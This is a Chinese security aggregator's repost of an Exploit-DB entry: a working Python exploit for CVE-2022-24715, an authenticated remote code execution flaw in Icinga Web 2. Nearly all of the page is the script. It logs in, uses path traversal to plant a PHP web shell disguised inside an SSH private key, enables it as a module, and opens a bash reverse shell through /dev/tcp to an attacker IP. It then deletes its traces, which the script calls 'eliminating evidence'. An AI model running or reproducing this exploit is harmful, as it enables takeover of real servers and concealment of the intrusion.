---
title: [webapps] Icinga Web 2.10 - Authenticated Remote Code Execution
url: https://buaq.net/go-172127.html
source: unSafe.sh - 不安全
date: 2023-07-16
fetch_date: 2025-10-04T11:51:17.321475
---

# [webapps] Icinga Web 2.10 - Authenticated Remote Code Execution

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

[webapps] Icinga Web 2.10 - Authenticated Remote Code Execution

*2023-7-15 08:0:0
Author: [www.exploit-db.com(查看原文)](/jump-172127.htm)
阅读量:19
收藏*

---

#### Platform:

###### [PHP](https://www.exploit-db.com/?platform=php)

#### Date:

###### 2023-07-15

```
#!/usr/bin/env python3

# Exploit Title: Icinga Web 2.10 - Authenticated Remote Code Execution
# Date: 8/07/2023
# Exploit Author: Dante Corona(Aka. cxdxnt)
# Software Link: https://github.com/Icinga/icingaweb2
# Vendor Homepage: https://icinga.com/
# Software Link: https://github.com/Icinga/icingaweb2
# Version: <2.8.6, <2.9.6, <2.10
# Tested on: Icinga Web 2 Version 2.9.2 on Linux
# CVE: CVE-2022-24715
# Based on: https://nvd.nist.gov/vuln/detail/CVE-2022-24715

import requests,argparse,re,random,string
from colorama import Fore,Style

def letter_random():
    letras = string.ascii_lowercase
    character_random = random.choices(letras, k=6)
    return ''.join(character_random)

def users_url_password():
    parser = argparse.ArgumentParser(description='Descripción de tu programa.')
    parser.add_argument('-u', '--url',type=str,required=True, help='Insertar la URL http://ip_victima')
    parser.add_argument('-U', '--user',type=str, required=True ,help='Insertar usuario -U user')
    parser.add_argument('-P', '--password',type=str, required=True ,help='Insertar contraseña -P password')
    parser.add_argument('-i', '--ip',type=str,required=True,help='Insertar IP de atacante -i IP')
    parser.add_argument('-p','--port',type=str, required=True,help='Insertar puerto de atacante -p PORT')
    args = parser.parse_args()
    url = args.url
    user = args.user
    password=args.password
    ip_attack = args.ip
    port_attack = args.port

    return url,user,password,ip_attack,port_attack

def login(url,user,password):
    try:
        login_url = url + "/icingaweb2/authentication/login"
        session = requests.Session()
        r = session.get(login_url)
        csrf_regex = re.findall(r'name="CSRFToken" value="([^"]*)"',r.text)[0]
        data_post = {"username":user,
                    "password":password,
                    "CSRFToken":csrf_regex,
                    "formUID":"form_login",
                    "btn_submit":"Login"
                    }
        response = session.post(login_url,data=data_post)
        if "Welcome to Icinga Web!" in response.text:
            print(f"{Fore.GREEN}[*]{Style.RESET_ALL}Session successfully.")
            r = session.get(login_url)
        else:
            print("[!]Failed to login.")
            exit(1)
        #return session,csrf_regex
    except requests.exceptions.InvalidURL:
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Error URL :(")
        exit(1)
    return session,csrf_regex

def upload_file(session,url,character_random,csrf_regex):
    webshell = f"""-----BEGIN RSA PRIVATE KEY-----
MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu
KUpRKfFLfRYC9AIKjbJTWit+CqvjWYzvQwECAwEAAQJAIJLixBy2qpFoS4DSmoEm
o3qGy0t6z09AIJtH+5OeRV1be+N4cDYJKffGzDa88vQENZiRm0GRq6a+HPGQMd2k
TQIhAKMSvzIBnni7ot/OSie2TmJLY4SwTQAevXysE2RbFDYdAiEBCUEaRQnMnbp7
9mxDXDf6AU0cN/RPBjb9qSHDcWZHGzUCIG2Es59z8ugGrDY+pxLQnwfotadxd+Uy
v/Ow5T0q5gIJAiEAyS4RaI9YG8EWx/2w0T67ZUVAw8eOMB6BIUg0Xcu+3okCIBOs
/5OiPgoTdSy7bcF9IGpSE8ZgGKzgYQVZeN97YE00
-----END RSA PRIVATE KEY-----
<?php system($_REQUEST["%s"]);?>
"""%character_random
    upload_url = url + "/icingaweb2/config/createresource"
    r = session.get(upload_url)
    csrf = re.findall(r'name="CSRFToken" value="([^"]*)"',r.text)[0]
    data_post ={"type":"ssh",
                "name":"shm/"+character_random,
                "user":f"../../../../../../../../../../../dev/shm/{character_random}/run.php",
                "private_key":webshell,
                "formUID":"form_config_resource",
                "CSRFToken":csrf,
                "btn_submit":"Save Changes"
                }
    upload_response = session.post(upload_url,data=data_post)
    check = requests.get(url + f"/icingaweb2/lib/icinga/icinga-php-thirdparty/dev/shm/{character_random}/run.php")
    if check.status_code != 200 :
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL}Error uploading file. :(")
        exit(1)
    else:
        print(f"{Fore.GREEN}[*]{Style.RESET_ALL}File uploaded successfully.")

def enable_module(session,url,character_random):
    url_module = url+"/icingaweb2/config/general"
    r_module = session.get(url_module)
    csrf_module = re.findall(r'name="CSRFToken" value="([^"]*)"',r_module.text)[0]
    data_post = {"global_show_stacktraces":"0",
                 "global_show_stacktraces":"1",
                 "global_show_application_state_messages":"0",
                 "global_show_application_state_messages":"1",
                 "global_module_path":"/dev/shm/",
                 "global_config_resource":"icingaweb2",
                 "logging_log":"none",
                 "themes_default":"Icinga",
                 "themes_disabled":"0",
                 "authentication_default_domain":"",
                 "formUID":"form_config_general",
                 "CSRFToken":f"{csrf_module}",
                 "btn_submit":"Save Changes"
                 }

    resul = session.post(url_module,data_post)
    #--------------------------------------------------
    url_enable = url +"/icingaweb2/config/moduleenable"
    r_enable = session.get(url_enable)
    csrf_enable = re.findall(r'name="CSRFToken" value="([^"]*)"',r_enable.text)[0]
    data_enable = {"identifier":f"{character_random}","CSRFToken":f"{csrf_enable}","btn_submit":"btn_submit"}
    resul_enable = session.post(url_enable,data_enable)

def reverse_shell(session,url,ip_attack,port_attack,character_random):
    reverse_url = url + "/icingaweb2/dashboard"
    reverse_exe_one = reverse_url + f'?{character_random}=echo+"bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip_attack}%2F{port_attack}%200%3E%261"+>+/tmp/{character_random}'
    reverse_exe_two = reverse_url + f"?{character_random}=bash+/tmp/{character_random} &"
    reverse_response_one = session.get(reverse_exe_one)
    try:
        reverse_response_two = session.get(reverse_exe_two, timeout=5)
    except:
        print(f"{Fore.RED}[*]{Style.RESET_ALL}Eliminating evidence")

    remove = session.get(reverse_url + f"?{character_random}=rm+/tmp/{character_random}")
    disable_url = url + "/icingaweb2/config/moduledisable"
    r_disable = session.get(disable_url)
    csrf_disable = re.findall(r'name="CSRFToken" value="([^"]*)"',r_disable.text)[0]
    data_disable = {"identifier":f"{character_random}","CSRFToken":csrf_disable,"btn_submit":"btn_submit"}
    response_disable = session.post(disable_url,data=data_disable)

def disable_module(session,url,character_random):
    url_disable = url + "/icingaweb2/config/moduledisable"

if __name__ == '__main__':
    character_random = letter_random()
    url,user,password,ip_attack,port_attack = users_url_password()
    session,csrf_regex = login(url,user,password)
    upload_file(session,url,character_random,csrf_regex)
    enable_module(session,url,character_random)
    reverse_shell(session,url,ip_attack,port_attack,character_random)
```

文章来源: https://www.exploit-db.com/exploits/51586
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)